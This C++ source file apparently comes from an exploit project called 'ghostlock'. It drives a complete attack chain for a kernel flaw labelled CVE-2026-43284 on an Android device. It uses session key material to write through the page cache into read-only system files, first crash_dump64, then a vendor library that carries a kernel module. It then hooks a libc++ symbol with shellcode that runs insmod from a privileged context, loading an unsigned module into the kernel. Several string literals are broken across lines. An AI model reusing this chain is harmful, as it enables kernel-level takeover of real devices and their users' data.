/** @file tools/pagecache_load_lkm.cpp
 *  A worked example: the 43284 kernel access, ending with a module in the kernel.
 *
 *  Every target value below is taken from commit 6f7ded87, which is the run that PASSed on this
 *  device (A301SO / 5.15.189-android13-8-00016-g51bba4309aac-ab14546557), not chosen here:
 *
 *   | value | as used by that run | where it is written down |
 *   | carrier | /vendor/lib64/libbinderdebug.so (the .ko goes there, from offset 0) | steps/chain.hpp:71 carrier table; the run passed it as the positional target |
 *   | patch #1 | /apex/com.android.runtime/bin/crash_dump64 at offset 0 | support/cli.hpp:20 default --cve43284-patch1-target |
 *   | hook | /system/lib64/libc++.so, symbol _ZNSt3__113basic_ostreamIcNS_11char_traitsIcEEE6sentryC1ERS3_, guard=skip | support/cli.hpp:19-21; steps/hook_patch.hpp:42,44; that run patched 0xb70ac (symbol at 0xb70a8, BTI skipped) |
 *   | module | /data/local/tmp/ghostlock.ko, 12304 B, sha256 d557fe11… | the PASS record; LKM built with DDK android13-5.15 |
 *   | trigger | double-fork with exec_path = nullptr: the sentry fires when init reaps the orphan, and the shellcode itself execs /vendor/bin/insmod <carrier> | real_ops.hpp:69 (delay 1000 ms), real_ops.cpp:355-388 |
 *   | wait | /dev/dfm1 failed · /dev/dfm0 loaded · /dev/df in flight (not terminal) · /sys/module/dirtyfrag present-then-gone = failed | real_ops.hpp:56-63, real_ops.cpp:392-430; budget 5000 ms (stage_runner.cpp:860) |
 *
 *  The four phases, in the order they have to happen:
 *
 *   1. Credentials. The access cannot write a block without the session's key material, and that
 *      material is a runtime secret: it arrives in the session frame, never in a profile, a file
 *      name, an argument or a log. That run's frame came over stdin from the app; this tool reads
 *      the same frame from a file so it can be driven by hand.
 *
 *   2. The module. Before a byte is written, the module has to be one this kernel can carry: its
 *      .modinfo is read without loading anything, and its vermagic must name the running release.
 *
 *   3. The write, through the access: sixteen bytes at a time, each block at its own position, each
 *      one read back afterwards. The read-back is what that run reported as verified=769, and it is
 *      the only thing that separates "the datagram was sent" from "the page now holds this".
 *
 *   4. The trigger and the wait, exactly as that run did them. This process is not root and never
 *      loads anything: the page cache write puts the image where a privileged context will insmod
 *      it, the trigger is what makes that context run, and the wait is the same device facts.
 *
 *  What this file does not do, and why. That run reached the carrier through two bridges the new
 *  tree declares but has not ported: the preimage read (crash_dump64, patched as step #1) and the
 *  page splice by the helper image (src/core/backend/cve_2026_43284/embed/splicehelper_blob.* in
 *  that tree). A process that cannot open /vendor/... needs both. So this example runs against a
 *  carrier this process can open -- the same one-shot relaxation that tree kept behind
 *  --allow-dev-target -- and refuses by name when the carrier cannot be opened, instead of writing
 *  a block whose preimage it could not read.
 *
 *  Unbuffered and bounded, as every probe here is.
 */
#include <cerrno>
#include <cstdio>
#include <cstddef>
#include <cstdint>
#include <cstring>
#include <fcntl.h>
#include <span>
#include <sys/utsname.h>
#include <sys/wait.h>
#include <unistd.h>

#include "backend/cve_2026_43284/access_params.hpp"
#include "backend/cve_2026_43284/embed/splicehelper_blob.hpp"
#include "backend/cve_2026_43284/hook/sentry_hook.hpp"
#include "backend/cve_2026_43284/kernel_access.hpp"
#include "backend/cve_2026_43284/seam/crash_dump_bridge.hpp"
#include "backend/cve_2026_43284/lkm/module_facts.hpp"
#include "backend/cve_2026_43284/seam/pagecache_door_linux.hpp"
#include "backend/cve_2026_43284/seam/pagecache_doors.hpp"
#include "backend/cve_2026_43284/seam/pagecache_seam.hpp"
#include "backend/cve_2026_43284/seam/pagecache_write.hpp"
#include "backend/cve_2026_43284/steps/pagecache_steps.hpp"
#include "backend/cve_2026_43284/seam/real_splice_io.hpp"
#include "backend/cve_2026_43284/session_frame.hpp"
#include "contract/kernel_access.hpp"
#include "support/sha256.hpp"

namespace {
    using ghostlock::backend::cve_2026_43284::Access;
    using ghostlock::backend::cve_2026_43284::AccessParams;
    using ghostlock::backend::cve_2026_43284::SaMaterial;
    using ghostlock::backend::cve_2026_43284::SessionFrameStatus;
    using ghostlock::backend::cve_2026_43284::lkm::ModuleFacts;
    using ghostlock::backend::cve_2026_43284::lkm::ModuleReadError;
    using ghostlock::backend::cve_2026_43284::lkm::read_module_facts;
    using ghostlock::backend::cve_2026_43284::lkm::vermagic_belongs_to;
    using ghostlock::backend::cve_2026_43284::lkm::vermagic_matches_kernel;
    using ghostlock::backend::cve_2026_43284::seam::kWriteWidth;
    using ghostlock::backend::cve_2026_43284::seam::PageCacheDoorLinux;
    using ghostlock::backend::cve_2026_43284::seam::PageCacheSeam;
    using ghostlock::backend::cve_2026_43284::seam::PageCacheWrite;
    using ghostlock::backend::cve_2026_43284::seam::RealSpliceIo;
    using ghostlock::backend::cve_2026_43284::embed::splicehelper_bytes;
    using ghostlock::backend::cve_2026_43284::embed::splicehelper_padded_size;
    using ghostlock::backend::cve_2026_43284::seam::real_splice_io;
    using ghostlock::backend::cve_2026_43284::seam::CrashDumpBridge;
    using ghostlock::backend::cve_2026_43284::hook::build_sentry_payload;
    using ghostlock::backend::cve_2026_43284::hook::device_sentry_plan;
    using ghostlock::backend::cve_2026_43284::hook::hook_branch;
    using ghostlock::backend::cve_2026_43284::hook::SentryError;
    using ghostlock::backend::cve_2026_43284::hook::SentryPlan;
    using ghostlock::backend::cve_2026_43284::seam::DoorOps;
    using ghostlock::backend::cve_2026_43284::seam::HelperWriteSource;
    using ghostlock::backend::cve_2026_43284::seam::OldPageSource;
    using ghostlock::contract::AccessChannel;

    /* The values 6f7ded87 used, one per line, so changing a target is changing this block. */
    /** The carrier that run wrote the module into, from offset zero. The tree's carrier table lists
     *  three more for other firmware: libstagefrighthw.so, libstagefright_aidl_bufferpool2.so,
     *  libbsp_module.so. */
    constexpr const char *kCarrierPath = "/vendor/lib64/libbinderdebug.so";
    constexpr std::uint64_t kCarrierBase = 0U;
    /** The one-shot carrier the same tree allowed behind --allow-dev-target, for a run whose process
     *  can open what it patches. Used when the vendor carrier cannot be opened. */
    constexpr const char *kDevCarrierPath = "/data/local/tmp/ghostlock-carrier";
    /** The module that run loaded. */
    constexpr const char *kModulePath = "/data/local/tmp/ghostlock.ko";
    /** Patch #1's target, and the hook's, printed because they are the rest of that chain. */
    constexpr const char *kPatch1Target = "/apex/com.android.runtime/bin/crash_dump64";
    constexpr const char *kHookTarget = "/system/lib64/libc++.so";
    constexpr const char *kHookSymbol =
        "_ZNSt3__113basic_ostreamIcNS_11char_traitsIcEEE6sentryC1ERS3_";
    /** That run's frame, read here from a file; the app hands the same frame over stdin. */
    constexpr const char *kFramePath = "/data/local/tmp/ghostlock-sa.frame";
    /** The trigger's own delay, and the wait's budget, both that run's numbers. */
    constexpr std::uint32_t kTriggerDelayMs = 1000U;
    constexpr std::uint32_t kWaitMs = 5000U;
    constexpr std::size_t kPollMs = 10U;
    constexpr std::size_t kModuleMaxBytes = 64U * 1024U * 1024U;
    /* TEMPORARY (2026-10-10, user request): read the session frame from stdin instead of the file, so
     * the App's temporary launcher can hand over a live SA without writing into /data/local/tmp.
     * Registered for removal with that launcher: when the production entry owns the SA, this mode and
     * the launcher activity go together. */
    bool g_frame_from_stdin = false;
    /** The kernel's VERMAGIC_STRING is `UTS_RELEASE " " SMP [preempt ] [mod_unload ] [modversions
     *  ]aarch64` (include/linux/vermagic.h). "preempt" is readable from /proc/version; mod_unload and
     *  modversions are not probeable from userspace, so they are the audited target build's values --
     *  the same defaults the retired tree kept (that tree's lkm_policy.hpp:109-110: modversions true,
     *  module_force_unload false, which advertises "mod_unload"). */
    constexpr const char *kSmpToken = "SMP";
    constexpr const char *kPreemptToken = "preempt";
    constexpr const char *kModuleUnloadToken = "mod_unload";
    constexpr const char *kModversionsToken = "modversions";
    constexpr const char *kArchToken = "aarch64";
    constexpr bool kModuleForceUnload = false;
    constexpr bool kModversions = true;

    /* The markers that run waited on, in the order it checked them. */
    constexpr const char *kLkmFailureMarker = "/dev/dfm1";
    constexpr const char *kLkmSuccessMarker = "/dev/dfm0";
    constexpr const char *kLkmHookMarker = "/dev/df";
    constexpr const char *kLkmModulePath = "/sys/module/dirtyfrag";

    std::uint8_t g_module[kModuleMaxBytes] = {};

    /** A borrowed path as a C string, for the calls that want one; empty when nothing was set. */
    /** 注入点一：路径是否存在（设备上就是 stat）。 */
    bool exists_adapter(const char *path) noexcept { return exists(path); }
    /** 注入点二：睡一个轮询间隔（设备上就是 usleep）。 */
    void sleep_ms(std::uint32_t ms) noexcept { ::usleep(static_cast<useconds_t>(ms) * 1000U); }

    const char *marker_text(const ghostlock::backend::cve_2026_43284::PathView &path) noexcept {
        static const char kEmpty[] = "";
        return path.empty() ? kEmpty : path.bytes;
    }

    bool exists(const char *path) noexcept {
        return ::access(path, F_OK) == 0;
    }

    /** Read a small text file into a buffer, NUL-terminated. Returns the length, or zero. */
    std::size_t read_text(const char *path, char *out, std::size_t capacity) noexcept {
        if (capacity == 0U) {
            return 0U;
        }
        const int fd = ::open(path, O_RDONLY | O_CLOEXEC);
        if (fd < 0) {
            return 0U;
        }
        std::size_t total = 0U;
        while (total + 1U < capacity) {
            const ssize_t got = ::read(fd, out + total, capacity - total - 1U);
            if (got < 0) {
                if (errno == EINTR) {
                    continue;
                }
                break;
            }
            if (got == 0) {
                break;
            }
            total += static_cast<std::size_t>(got);
        }
        (void) ::close(fd);
        out[total] = '\0';
        return total;
    }

    /** The running kernel's vermagic, composed the way include/linux/vermagic.h composes it. */
    void compose_kernel_vermagic(const char *release, const char *proc_version, char *out,
                                 std::size_t capacity) noexcept {
        if (out == nullptr || capacity == 0U) {
            return;
        }
        const bool preempt = std::strstr(proc_version, "PREEMPT") != nullptr;
        std::size_t at = 0U;
        const auto append = [&](const char *text) noexcept {
            const std::size_t width = std::strlen(text);
            if (at + width + 1U >= capacity) {
                return;
            }
            std::memcpy(out + at, text, width);
            at += width;
        };
        append(release);
        append(" ");
        append(kSmpToken);
        if (preempt) {
            append(" ");
            append(kPreemptToken);
        }
        if (!kModuleForceUnload) {
            append(" ");
            append(kModuleUnloadToken);
        }
        if (kModversions) {
            append(" ");
            append(kModversionsToken);
        }
        append(" ");
        append(kArchToken);
        out[at] = '\0';
    }

    /** Read a whole file into the module buffer. Returns the size, or zero. */
    std::size_t read_file(const char *path, std::uint8_t *out, std::size_t capacity) noexcept {
        const int fd = ::open(path, O_RDONLY | O_CLOEXEC);
        if (fd < 0) {
            std::printf("example: cannot open %s (errno %d)\n", path, errno);
            return 0U;
        }
        std::size_t total = 0U;
        while (total < capacity) {
            const ssize_t got = ::read(fd, out + total, capacity - total);
            if (got < 0) {
                if (errno == EINTR) {
                    continue;
                }
                std::printf("example: read failed (errno %d)\n", errno);
                (void) ::close(fd);
                return 0U;
            }
            if (got == 0) {
                break;
            }
            total += static_cast<std::size_t>(got);
        }
        (void) ::close(fd);
        return total;
    }

    /** Phase 1: the session frame, through the same reader the entry uses. */
    bool phase_credentials(SaMaterial &sa) noexcept {
        int fd = 0;
        if (!g_frame_from_stdin) {
            fd = ::open(kFramePath, O_RDONLY | O_CLOEXEC);
            if (fd < 0) {
                std::printf("example: phase 1 refused, no frame at %s\n", kFramePath);
                return false;
            }
        } else {
            std::printf("example: phase 1 frame from stdin (temporary launcher mode)\n");
        }
        const SessionFrameStatus read =
            ghostlock::backend::cve_2026_43284::read_session_secret_frame(fd, &sa);
        if (!g_frame_from_stdin) {
            (void) ::close(fd);
        }
        if (read != SessionFrameStatus::Ok) {
            std::printf("example: phase 1 refused, frame status %u\n", static_cast<unsigned>(read));
            return false;
        }
        /* Declaring the material usable is the caller's act, as the frame's own header says. */
        sa.set = true;
        std::printf("example: phase 1 ok, credentials held (spi=0x%08x icv_len=%u)\n", sa.spi,
                    static_cast<unsigned>(sa.icv_len));
        return true;
    }

    /** Phase 2: the module has to be one this kernel can carry, by the kernel's own rule. */
    bool phase_module(const char *release, const char *kernel_vermagic, std::size_t &size,
                      ModuleFacts &facts) noexcept {
        size = read_file(kModulePath, g_module, sizeof(g_module));
        if (size == 0U) {
            std::printf("example: phase 2 refused, no module bytes at %s\n", kModulePath);
            return false;
        }
        facts = read_module_facts(g_module, size);
        if (facts.error != ModuleReadError::None) {
            std::printf("example: phase 2 refused, module unreadable as %s\n",
                        ghostlock::backend::cve_2026_43284::lkm::module_read_error_name(facts.error));
            return false;
        }
        if (facts.signed_module) {
            std::printf("example: phase 2 refused, the module is signed and the key cannot be "
                        "checked here\n");
            return false;
        }
        /* The kernel's rule, not the strict one: a module that carries CRCs is compared on the part
         * after its first space, so another release of the same KMI passes. The strict release rule
         * is still printed, because a reader wants to see both answers and why they differ. */
        const bool matches = vermagic_matches_kernel(facts.vermagic, kernel_vermagic, facts.has_crcs);
        std::printf("example: phase 2 module vermagic %s\n", facts.vermagic);
        std::printf("example: phase 2 kernel vermagic %s\n", kernel_vermagic);
        std::printf("example: phase 2 has_crcs=%d signed=%d cfi=%d strict_release_match=%d\n",
                    facts.has_crcs ? 1 : 0, facts.signed_module ? 1 : 0, facts.cfi_present ? 1 : 0,
                    vermagic_belongs_to(facts.vermagic, release) ? 1 : 0);
        if (!matches) {
            std::printf("example: phase 2 refused, the kernel would not accept that vermagic\n");
            return false;
        }
        const ghostlock::support::Sha256Digest digest = ghostlock::support::sha256(g_module, size);
        std::printf("example: phase 2 ok, %s (%zu bytes, sha256 %02x%02x%02x%02x...) the kernel "
                    "accepts\n",
                    facts.name, size, digest.bytes[0], digest.bytes[1], digest.bytes[2],
                    digest.bytes[3]);
        return true;
    }

    /** A carrier this process never opens: the bridges serve both halves, and the door keeps only
     *  the socket half (which is how the retired chain ran a vendor carrier). */
    /** Phase 3a: patch #1, the helper image written over the first blocks of crash_dump64. The file
     *  is one this process can read, so the preimage comes straight from it; once the image is
     *  there, executing that path runs the helper in the crash_dump domain and the vendor carrier
     *  becomes reachable. */
    bool phase_patch1(Access &access, AccessParams &params) noexcept {
        /* 与 script 侧的 patch1 步骤共用同一实现（steps/pagecache_steps）。 */
        steps::WriteRequest request{};
        request.access = &access;
        request.params = &params;
        request.image = std::span<const std::byte>(
                reinterpret_cast<const std::byte *>(splicehelper_bytes()), splicehelper_padded_size());
        request.offset = 0U;
        request.width = kWriteWidth;
        const char *refusal = nullptr;
        if (!steps::write_image_verified(request, &refusal)) {
            std::printf("example: phase 3a refused (%s)
", refusal);
            return false;
        }
        std::printf("example: phase 3a ok, helper image (%zu bytes) written to %s@0
",
                    splicehelper_padded_size(), kPatch1Target);
        return true;
    }

    void put_le32(std::uint8_t *p, std::uint32_t value) noexcept {
        p[0] = static_cast<std::uint8_t>(value & 0xFFU);
        p[1] = static_cast<std::uint8_t>((value >> 8U) & 0xFFU);
        p[2] = static_cast<std::uint8_t>((value >> 16U) & 0xFFU);
        p[3] = static_cast<std::uint8_t>((value >> 24U) & 0xFFU);
    }

    /** Phase 5: the sentry hook. One word at the site -- read, modified inside its own block and
     *  written back, so the rest of that block survives -- and the payload at the landing site, which
     *  carries the word it displaced and the branch back. */
    bool phase_hook(Access &access, AccessParams &params, const SentryPlan &plan) noexcept {
        /* 与 script 侧的 hook 步骤共用同一实现（站点一个字 + landing 载荷）。 */
        steps::HookRequest request{};
        request.access = &access;
        request.params = &params;
        request.plan = &plan;
        request.width = kWriteWidth;
        const char *refusal = nullptr;
        if (!steps::write_hook(request, &refusal)) {
            std::printf("example: phase 5 refused (%s)
", refusal);
            return false;
        }
        std::printf("example: phase 5 ok, site 0x%llx and payload 0x%llx in place
",
                    static_cast<unsigned long long>(plan.hook_file_offset),
                    static_cast<unsigned long long>(plan.payload_file_offset));
        return true;
    }

    /** Phase 3: the write itself, one block at a time, each one read back. */
    bool phase_write(Access &access, AccessParams &params, std::size_t module_size) noexcept {
        /* 与 script 侧的 carrier 步骤共用同一实现。 */
        steps::WriteRequest request{};
        request.access = &access;
        request.params = &params;
        request.image = std::span<const std::byte>(reinterpret_cast<const std::byte *>(g_module),
                                                   module_size);
        request.offset = kCarrierBase;
        request.width = kWriteWidth;
        const char *refusal = nullptr;
        if (!steps::write_image_verified(request, &refusal)) {
            std::printf("example: phase 3 refused (%s)
", refusal);
            return false;
        }
        const std::size_t blocks = (module_size + kWriteWidth - 1U) / kWriteWidth;
        std::printf("example: phase 3 ok, %zu blocks written and verified at 0x%llx of %s
", blocks,
                    static_cast<unsigned long long>(kCarrierBase), kCarrierPath);
        return true;
    }

    /** Phase 4a: the trigger, unchanged from that run. The grandchild is reparented to init; when
     *  init reaps it, the hooked sentry runs, and the shellcode execs
     *  /vendor/bin/insmod <carrier> in the vendor_modprobe domain. This process passes no exec path
     *  of its own -- that is the point of the hook. */
    bool trigger_orphan(std::uint32_t delay_ms) noexcept {
        /* 与 script 侧的 trigger 步骤共用同一实现。 */
        const char *refusal = steps::trigger_orphan(delay_ms);
        if (refusal != nullptr) {
            std::printf("example: phase 4 trigger refused (%s)
", refusal);
            return false;
        }
        return true;
    }


    /** Phase 4b: the wait, in that run's own order. Failure first, because a stale success marker
     *  must not mask a fresh failure. */
    bool wait_for_lkm(const ModuleFacts &facts, const AccessParams &params) noexcept {
        /* 与 script 侧的 wait 步骤共用同一实现；时钟与存在性检查由调用方注入。 */
        WaitRequest request{};
        request.success_marker = marker_text(params.success_marker);
        request.failure_marker = marker_text(params.failure_marker);
        request.in_flight_marker = marker_text(params.in_flight_marker);
        request.module_dir = marker_text(params.module_marker);
        request.module_name = facts.name[0] != '\0' ? facts.name : nullptr;
        request.budget_ms = params.wait_ms;
        request.poll_ms = static_cast<std::uint32_t>(kPollMs);
        request.exists = &exists_adapter;
        request.sleep_ms = &sleep_ms;
        const char *refusal = wait_for_module(request);
        if (refusal != nullptr) {
            std::printf("example: phase 4 refused (%s) after %u ms
", refusal, params.wait_ms);
            return false;
        }
        std::printf("example: phase 4 ok, %s present
", marker_text(params.success_marker));
        return true;
    }

}  // namespace

int main(int argc, char **argv) {
    std::setvbuf(stdout, nullptr, _IONBF, 0U);
    /* TEMPORARY: one switch only, owned by the temporary launcher. */
    for (int i = 1; i < argc; ++i) {
        if (std::strcmp(argv[i], "--frame-stdin") == 0) {
            g_frame_from_stdin = true;
        }
    }
    std::printf("example: 43284 kernel access, ending in a loaded module\n");
    std::printf("example: carrier %s offset 0x%llx · module %s · patch#1 %s\n", kCarrierPath,
                static_cast<unsigned long long>(kCarrierBase), kModulePath, kPatch1Target);
    std::printf("example: hook %s (%s), the rest of that chain\n", kHookTarget, kHookSymbol);

    struct utsname uts {};
    if (::uname(&uts) != 0) {
        std::printf("example: cannot read the running release\n");
        return 1;
    }

    SaMaterial sa{};
    if (!phase_credentials(sa)) {
        return 2;
    }
    char proc_version[512] = {};
    char kernel_vermagic[256] = {};
    static_cast<void>(read_text("/proc/version", proc_version, sizeof(proc_version)));
    compose_kernel_vermagic(uts.release, proc_version, kernel_vermagic, sizeof(kernel_vermagic));
    std::size_t module_size = 0U;
    ModuleFacts facts{};
    if (!phase_module(uts.release, kernel_vermagic, module_size, facts)) {
        return 3;
    }

    /* Every value the device rounds proved has to come from outside goes into the parameter set --
     *  this tool is the caller, so this block is the caller's half of the interface. The constants
     *  above are this fixture's values; the parameters are what the backend actually sees. */
    AccessParams params{};
    params.sa = sa;
    params.carrier = {kCarrierPath, std::strlen(kCarrierPath)};
    params.carrier_base = kCarrierBase;
    params.dev_carrier = {kDevCarrierPath, std::strlen(kDevCarrierPath)};
    params.patch_target = {kPatch1Target, std::strlen(kPatch1Target)};
    params.hook_image = {kHookTarget, std::strlen(kHookTarget)};
    params.kernel_release = {uts.release, std::strlen(uts.release)};
    params.kernel_preempt = std::strstr(proc_version, "PREEMPT") != nullptr;
    params.kernel_modversions = kModversions;
    params.kernel_module_force_unload = kModuleForceUnload;
    params.hook_plan = device_sentry_plan();
    params.hook_plan_set = true;
    params.trigger_delay_ms = kTriggerDelayMs;
    params.wait_ms = kWaitMs;
    params.success_marker = {kLkmSuccessMarker, std::strlen(kLkmSuccessMarker)};
    params.failure_marker = {kLkmFailureMarker, std::strlen(kLkmFailureMarker)};
    params.in_flight_marker = {kLkmHookMarker, std::strlen(kLkmHookMarker)};
    params.module_marker = {kLkmModulePath, std::strlen(kLkmModulePath)};
    if (!params.consistent()) {
        std::printf("example: the parameter set is inconsistent; refusing\n");
        return 2;
    }

    /* Stack A: patch #1. The helper image goes over the first blocks of crash_dump64 through the
     *  same access, because that file this process can read -- which is exactly why the retired
     *  chain patched it first and used it as the bridge for everything else. */
    PageCacheDoorLinux patch_door(params.patch_target.bytes, params.patch_target.length);
    const int patch_fd = patch_door.open_target();
    if (patch_fd < 0) {
        std::printf("example: cannot open the patch target %s (errno %d)\n", kPatch1Target, errno);
        return 4;
    }
    std::uint32_t spent_sequence = 1U;
    {
        RealSpliceIo patch_surface(real_splice_io(), patch_fd);
        PageCacheWrite patch_window(patch_door, patch_surface);
        PageCacheSeam patch_seam(patch_window);
        Access patch_access(&patch_seam);
        const auto up = patch_access.initialize(params);
        if (!up.ok()) {
            std::printf("example: initialize refused for the patch target (%s)\n",
                        ghostlock::contract::KernelAccess::status_name(up.status));
            (void) ::close(patch_fd);
            return 5;
        }
        const bool patched = phase_patch1(patch_access, params);
        /* The carrier's window continues where this one stopped: one security association, one
         *  sequence space, which is what the kernel's anti-replay window counts. */
        spent_sequence = patch_window.next_seq();
        (void) patch_access.shutdown();
        if (!patched) {
            (void) ::close(patch_fd);
            return 6;
        }
    }

    /* Stack B: the carrier. The vendor path is the target the retired chain used; when this process
     *  cannot open it, the patched helper is what reads and splices its page instead -- that is what
     *  patch #1 was for. A carrier this process can open needs neither bridge. */
    const char *carrier = params.carrier.bytes;
    PageCacheDoorLinux door(carrier, params.carrier.length);
    CrashDumpBridge bridge;
    OldPageSource old_page{};
    HelperWriteSource helper{};
    int target_fd = door.open_target();
    if (target_fd < 0) {
        if (!bridge.bind(params.patch_target.bytes, params.patch_target.length, carrier,
                         params.carrier.length)) {
            std::printf("example: cannot open %s (errno %d) and the bridge refused the paths\n",
                        carrier, errno);
            (void) ::close(patch_fd);
            return 4;
        }
        old_page = bridge.old_page();
        helper = bridge.helper();
        std::printf("example: %s cannot be opened by this process (errno %d); the patched helper "
                    "reads and splices it\n",
                    carrier, errno);
    }
    seam::RemoteDoor remote_door(door);
    DoorOps &doors = (target_fd < 0) ? static_cast<DoorOps &>(remote_door)
                                     : static_cast<DoorOps &>(door);
    RealSpliceIo surface(real_splice_io(), target_fd, 0, old_page, helper);
    PageCacheWrite window(doors, surface);
    /* The session's sequence: the access adopts it at bring-up when the set carries one, which is
     *  what keeps a second window from restarting a sequence the kernel has already seen. */
    if (spent_sequence > 1U) {
        params.sequence = spent_sequence;
        params.sequence_set = true;
    }
    PageCacheSeam seam(window);
    Access access(&seam);
    const auto up = access.initialize(params);
    if (!up.ok()) {
        std::printf("example: initialize refused (%s)\n",
                    ghostlock::contract::KernelAccess::status_name(up.status));
        (void) ::close(patch_fd);
        if (target_fd >= 0) {
            (void) ::close(target_fd);
        }
        return 5;
    }
    std::printf("example: the route is up (state %s, width 16, carrier %s, seq from %u)\n",
                ghostlock::contract::KernelAccess::state_name(access.state(AccessChannel::PageCache)),
                target_fd >= 0 ? "opened here" : "through the bridge",
                static_cast<unsigned>(spent_sequence));

    const bool wrote = phase_write(access, params, module_size);
    /* Hand the session's sequence on again: the hook stack writes through the same association, and a
     *  window that restarted at one would have every datagram dropped as a replay. */
    spent_sequence = window.next_seq();
    const auto down = access.shutdown();
    std::printf("example: the route is down (%s)\n",
                ghostlock::contract::KernelAccess::status_name(down.status));
    (void) ::close(patch_fd);
    if (target_fd >= 0) {
        (void) ::close(target_fd);
    }
    if (!wrote) {
        return 6;
    }

    /* Stack C: the sentry hook. libc++ is a file this process can read, so the preimage comes
     *  straight from it, and what is written is one word at the site plus the payload. */
    {
        PageCacheDoorLinux hook_door(params.hook_image.bytes, params.hook_image.length);
        const int hook_fd = hook_door.open_target();
        if (hook_fd < 0) {
            std::printf("example: cannot open the hook target %s (errno %d)\n", kHookTarget, errno);
            return 4;
        }
        RealSpliceIo hook_surface(real_splice_io(), hook_fd);
        PageCacheWrite hook_window(hook_door, hook_surface);
        PageCacheSeam hook_seam(hook_window);
        Access hook_access(&hook_seam);
        const auto hook_up = hook_access.initialize(params);
        if (!hook_up.ok()) {
            std::printf("example: initialize refused for the hook target (%s)\n",
                        ghostlock::contract::KernelAccess::status_name(hook_up.status));
            (void) ::close(hook_fd);
            return 5;
        }
        if (spent_sequence > 1U) {
            params.sequence = spent_sequence;
            params.sequence_set = true;
        }
        const SentryPlan &plan = params.hook_plan;
        std::printf("example: hook plan site 0x%llx (vaddr 0x%llx) displaced 0x%08x guard %s\n",
                    static_cast<unsigned long long>(plan.hook_file_offset),
                    static_cast<unsigned long long>(plan.hook_vaddr), plan.displaced_instruction,
                    plan.guard_skipped ? "skipped" : "kept");
        const bool hooked = phase_hook(hook_access, params, plan);
        const auto hook_down = hook_access.shutdown();
        (void) ::close(hook_fd);
        if (!hooked) {
            std::printf("example: the hook was not applied; stopping before the trigger\n");
            return 6;
        }
        std::printf("example: the hook route is down (%s)\n",
                    ghostlock::contract::KernelAccess::status_name(hook_down.status));
    }

    /* The writes are done; the load is the kernel's, and the trigger is what asks for it. */
    if (!trigger_orphan(params.trigger_delay_ms)) {
        std::printf("example: the trigger refused to start\n");
        return 7;
    }
    return wait_for_lkm(facts, params) ? 0 : 8;
}
